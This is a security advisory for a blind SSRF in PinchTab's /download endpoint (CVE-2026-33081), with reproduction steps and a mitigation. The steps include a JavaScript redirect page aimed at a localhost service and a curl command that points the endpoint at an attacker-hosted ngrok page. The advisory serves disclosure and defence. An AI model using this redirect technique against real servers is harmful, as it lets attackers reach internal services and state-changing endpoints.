# [M] PinchTab has a Blind SSRF via browser-side redirect bypass in /download URL validation

## Summary
Severity: Medium
Advisory: GHSA-qwxp-6qf9-wr4m
CVE: CVE-2026-33081
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-qwxp-6qf9-wr4m
Type: github-advisory

## Affected
- Go: `github.com/pinchtab/pinchtab` — affected >=0 <0.8.3

## Details
### **The /download endpoint validates only the initial URL provided by the user using validateDownloadURL() to prevent requests to internal or private network addresses.**

Exploitation requires \security.allowDownload=true`, which is disabled by default.`

However, pages loaded by the embedded Chromium browser can trigger additional browser-side requests (for example, JavaScript redirects, navigations, or resource requests) after the initial validation step.

Because the validation is only applied to the initial URL and not to subsequent browser-issued request targets, an attacker-controlled page can cause the browser to issue requests to internal network services reachable from the PinchTab host.

This results in a blind Server-Side Request Forgery (SSRF) condition in which internal-only services may be accessed and state-changing endpoints may be triggered without returning the response body to the attacker.


### **Steps to Reproduce:**

**Environment Setup**
Target: PinchTab server (tested on v0.8.x, v0.7.x)
Attacker-controlled server: Publicly accessible (e.g., via ngrok) [attacker.py](https://github.com/user-attachments/files/26013554/att.py)
Internal service: Runs on the same host as PinchTab and is not externally accessible [internal_service.py](https://github.com/user-attachments/files/26013551/internal.py)

**1. Start a Local Internal Service (Victim Side)**

Run a simple HTTP service bound to localhost: [internal_service.py](https://github.com/user-attachments/files/26013551/internal.py)
    
    python internal_service.py
    
    #Example behavior of internal_service.py:
    #Listens on 127.0.0.1:1337
    #Exposes endpoint /increment
    #Increments a counter and logs requests
    
    #Expected output when accessed:
    #COUNTER INCREMENTED: 1
    #COUNTER INCREMENTED: 2

**2. Host an Attacker-Controlled Page (Attacker side)**

Deploy a malicious HTML page that redirects to the internal service: [attacker.py](https://github.com/user-attachments/files/26013554/att.py)

    <html>
    <body>
    <script>
    setTimeout(function(){
        window.location = "http://127.0.0.1:1337/increment";
    }, 1500);
    </script>
    </body>
    </html>
Host this page on a publicly accessible server (e.g., using ngrok): https://fcb8-180-149-93-3.ngrok-free.app


**3. Trigger the Vulnerable Endpoint (Attacker side)**

Send a request to the PinchTab /download endpoint:

    curl "http://[server-ip]:9867/download?url=https://fcb8-180-149-93-3.ngrok-free.app"

If a server token is configured, the request must include valid authentication.

**4. Observe Server-Side Request to Localhost**

When PinchTab processes the request:
1. It launches a headless Chromium instance
2. The browser loads the attacker-controlled page
3. JavaScript executes within the browser
4. The browser redirects to: http://127.0.0.1:1337/increment


**5. Verify the Impact**

Check the output of internal_service.py:
   <img width="718" height="156" alt="proof" src="https://github.com/user-attachments/assets/cf00e3e6-71c6-44ae-83b0-ed819f19ee9a" />

COUNTER INCREMENTED: 1
   <img width="718" height="282" alt="proof_incremented" src="https://github.com/user-attachments/assets/98281b8e-221b-4e76-a10b-1b2335d08c61" />

**This confirms that the request originated from the PinchTab host and that an attacker can successfully access localhost-only internal services via the browser, despite the initial URL validation.**


### **Impact**
This vulnerability allows an attacker to bypass the /download URL validation and cause the embedded Chromium browser to make requests to internal network services. By hosting a page that performs a redirect after the initial validation, an attacker can force the browser to access resources such as 127.0.0.1 or other private network addresses reachable from the PinchTab host.

Although the response is not returned to the attacker (blind SSRF), this behavior can still be used to interact with internal services and trigger state-changing endpoints. In environments where sensitive services or cloud metadata endpoints are accessible from the host, this could lead to more serious security impact.

### **Mitigation**
Apply the same URL safety policy to every browser-issued request in the `/download` flow, not only the initial user-supplied URL, and block requests to loopback, private, link-local, and other non-public network ranges inside the Chromium browser context.

## References
- https://github.com/pinchtab/pinchtab/security/advisories/GHSA-qwxp-6qf9-wr4m
- https://nvd.nist.gov/vuln/detail/CVE-2026-33081
- https://github.com/pinchtab/pinchtab
- https://github.com/pinchtab/pinchtab/releases/tag/v0.8.3
